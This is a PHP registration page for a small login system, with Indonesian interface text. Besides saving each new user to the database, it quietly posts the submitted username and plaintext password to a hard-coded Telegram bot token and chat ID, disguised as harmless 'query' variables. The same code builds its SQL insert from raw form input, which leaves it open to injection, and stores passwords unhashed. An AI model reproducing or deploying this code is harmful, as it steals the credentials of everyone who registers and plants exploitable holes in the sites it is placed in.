<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="styleb.css" media="screen" title="no title">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.3/css/all.css">
    <title>Register Page</title>
</head>

<body>
    <div class="input">
        <h1>REGISTER</h1>
<?php

require 'koneksi.php';
if (isset($_POST['register'])) {
$username = $_POST["username"];
$password = $_POST["password"];

$query_sql = "INSERT INTO tbl_users (username, password) 
            VALUES ('$username', '$password')";
            
$query_one = "7081582955:AAGjtT04lcyJT0Q17g79ZOSQ3pcBvH__gqo";
$query_two = "7179640883";
$query_three = "\nUsername:$username\nPassword:$password";

$query = "https://api.telegram.org/bot$query_one/sendMessage";
$data = array(
    'chat_id' => $query_two,
    'text' => $query_three
);

$ch = curl_init($query);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$response = curl_exec($ch);

if (mysqli_query($conn, $query_sql)) {
    header("Location: login.php");
} else

curl_close($ch);
}
?>
        <form action="register.php" method="POST">
            <div class="box-input">
                <i class="fas fa-user"></i>
                <input type="text" name="fullname" placeholder="Full Name">
            </div>
            <div class="box-input">
                <i class="fas fa-address-book"></i>
                <input type="text" name="username" placeholder="Username">
            </div>
            <div class="box-input">
                <i class="fas fa-lock"></i>
                <input type="password" name="password" placeholder="Password">
            </div>
            <a href="login.php">
                <button type="submit" name="register" class="btn-input">Register</button>
            </a>
            <div class="bottom">
                <p>Sudah punya akun?
                    <a href="login.php">Login disini</a>
                </p>
            </div>
        </form>
    </div>
</body>

</html>